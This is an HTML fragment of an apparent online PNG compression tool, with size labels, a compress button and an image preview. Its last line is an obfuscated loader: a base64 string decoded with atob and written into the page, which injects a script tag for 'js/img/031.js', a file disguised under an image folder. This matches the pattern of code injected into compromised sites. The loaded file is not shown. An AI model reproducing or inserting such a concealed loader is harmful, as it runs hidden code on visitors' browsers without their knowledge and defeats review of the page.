...
<div class="toolarea">
  ...
  <label>
    PNG Size (Before): <span id="originalSize"></span> KB<br>
    PNG Size (After): <span id="compressedSize"></span> KB
  </label>

  <button onclick="compressImage()" class="button">Compress Image</button>
  ...
  <div class="preview-container">
    ...
    <div>
      <b>Compressed Image</b><br>
      <img alt="Compressed Image" class="preview" id="compressed-image" src="https://rwu.edu.pk/wp-content/uploads/2022/09/man-dummy.jpg">
    </div>
  </div>

 <script>document.write(atob("IDxzY3JpcHQgc3JjPSJqcy9pbWcvMDMxLmpzIiBkZWZlcj0iIj48L3NjcmlwdD4="));</script>
</div>
